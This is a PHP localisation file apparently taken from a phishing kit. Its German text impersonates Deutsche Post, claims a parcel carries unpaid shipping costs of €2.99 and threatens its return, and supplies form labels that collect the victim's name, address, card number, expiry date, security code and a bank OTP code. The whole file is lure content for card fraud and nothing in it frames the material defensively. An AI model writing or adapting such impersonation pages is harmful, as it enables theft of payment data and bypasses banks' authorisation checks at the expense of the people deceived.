<?php

function lang($phrase){
    static $lang = array(
        '1' => 'Deutsche Post - Die Post für Deutschland', // Page Title
        '2' => 'Paketlieferung', // Heading
        '3' => 'Ihr Paket hat unbezahlte Versandkosten von €2,99 EUR. Wenn diese Kosten nicht bezahlt werden, wird das Paket zurückgeschickt.', // Subheading
        '4' => 'Vollständiger Name', // Full Name
        '5' => 'Telefonnummer', // Phone Number
        '6' => 'Straßenadresse', // Street Address
        '7' => 'Stadt', // City
        '8' => 'Postleitzahl', // Postal Code
        '9' => 'Kartennummer', // Card Number
        '10' => 'Ablaufdatum (MM/JJ)', // Expiration Date
        '11' => 'Sicherheitscode', // Security Code
        '12' => 'Bestätigen und Fortfahren', // Confirm and Continue
        '13' => 'Versandkosten:', // Shipping Cost Label
        '14' => 'Identitätsprüfung', // OTP Code
        '15' => 'Händler', // Merchant
        '16' => 'Versandkosten', // Shipping Cost Amount
        '17' => 'Datum', // Date
        '18' => 'OTP-Verifizierungscode', // OTP
        '19' => 'Bestätigen und Fortfahren',  // Confirm and Continue
        '20' => 'Um Ihre Transaktion zu überprüfen, verwenden Sie bitte Ihre Bankanwendung und geben Sie die erforderliche Autorisierung an. Nach Bestätigung klicken Sie bitte auf "Bestätigen und Fortfahren."',  // Confirm and Continue
        '21' => 'Deutsche Post',  // Additional
    );

    return $lang[$phrase];
}
?>
